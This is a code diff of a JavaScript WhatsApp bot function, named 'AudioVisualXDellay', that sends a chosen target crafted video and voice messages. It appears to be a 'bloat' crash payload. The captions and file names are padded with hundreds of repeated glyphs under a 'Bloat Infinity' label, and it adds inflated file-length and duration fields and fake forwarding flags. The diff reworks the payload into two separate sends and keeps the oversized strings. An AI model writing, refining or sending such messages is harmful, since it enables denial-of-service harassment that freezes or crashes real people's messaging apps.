@@ -47,44 +47,41 @@ module.exports = {
 };
 
 async function AudioVisualXDellay(sock, target) {
-  const msg = {
-    to: target,
-    message: {
-      viewOnceMessage: {
-        message: {
-          videoMessage: {
-            caption: "꧔꧈".repeat(600),
-            mimetype: "video/mp4",
-            fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺", 
-            fileLength: "9999999999",
-            seconds: 999999,
-            mediaKey: "v/J9vWyG92CnR0fqagJ7GBxQzmDG3+cV+DBL1yyECBI=",
-            contextInfo: {
-              forwardingScore: 9999,
-              isForwarded: true
-            }
-          }
-        }
-      },
-      audioMessage: {
-        mimetype: "audio/ogg; codecs=opus",
-        ptt: true,
-        seconds: 9999,
-        fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺" + "꧔꧈".repeat(500),
-        fileLength: "9999999999",
-        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", 
-        contextInfo: {
-          forwardingScore: 9999,
-          isForwarded: true,
-          mentionedJid: [
-            ...Array.from({ length: 1 }, () =>
-              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-            )
-          ]
-        }
-      }
+  // First send the video message
+  const videoMsg = {
+    video: {
+      url: 'https://example.com/dummy.mp4', // Placeholder URL
+      caption: "꧔꧈".repeat(600),
+      mimetype: "video/mp4",
+      fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺",
+      viewOnce: true
+    },
+    contextInfo: {
+      forwardingScore: 9999,
+      isForwarded: true
     }
   };
 
-  await sock.sendMessage(msg.to, msg.message);
+  // Then send the audio message
+  const audioMsg = {
+    audio: {
+      url: 'https://example.com/dummy.ogg', // Placeholder URL
+      mimetype: "audio/ogg; codecs=opus",
+      ptt: true,
+      fileName: "𝐁𝐥𝐨𝐚𝐝 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🇷🇺" + "꧔꧈".repeat(500)
+    },
+    contextInfo: {
+      forwardingScore: 9999,
+      isForwarded: true,
+      mentionedJid: [
+        ...Array.from({ length: 1 }, () =>
+          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+      ]
+    }
+  };
+
+  // Send messages separately with proper media handling
+  await sock.sendMessage(target, videoMsg);
+  await sock.sendMessage(target, audioMsg);
 }
